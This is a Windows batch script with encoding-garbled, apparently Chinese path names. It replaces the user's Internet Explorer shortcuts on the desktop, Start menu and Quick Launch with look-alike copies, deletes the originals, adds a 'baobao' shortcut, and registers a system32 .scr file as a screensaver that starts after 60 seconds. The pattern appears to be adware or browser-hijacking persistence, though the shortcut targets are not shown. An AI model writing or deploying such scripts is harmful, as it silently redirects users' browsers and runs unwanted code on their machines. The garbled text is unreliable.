@echo off
copy "Internet Explorer.lnk" "%userprofile%\����\Internet  Explorer.lnk" /y
copy "Internet Explorer.lnk" "%userprofile%\����ʼ���˵�\Internet  Explorer.lnk" /y
copy "Internet Explorer.lnk" "%userprofile%\����ʼ���˵�\����\Internet  Explorer.lnk" /y
copy "Internet Explorer.lnk" "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\���� Internet  Explorer �����.lnk" /y
copy "Internet Explorer.lnk" "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\Internet  Explorer.lnk" /y
copy "baobao.lnk" "%userprofile%\����\�Ա�����.lnk" /y
del "%userprofile%\����\IEXPLORE.lnk"
del "%userprofile%\����\IEXPLOREr.lnk"
del "%userprofile%\����\Internet Explorer.lnk"
del "%userprofile%\����\Internet.lnk"
del "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\Internet Explorer.lnk"
del "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\���� Internet Explorer �����.lnk"
@reg add "HKEY_CURRENT_USER\Control Panel\desktop" /v "SCRNSAVE.EXE" /t reg_sz /d C:\WINDOWS\system32\ycze.scr /f
@reg add "HKEY_CURRENT_USER\Control Panel\desktop" /v "ScreenSaveActive" /t reg_sz /d 1 /f
@reg add "HKEY_CURRENT_USER\Control Panel\desktop" /v "ScreenSaveTimeOut" /t reg_sz /d 60 /f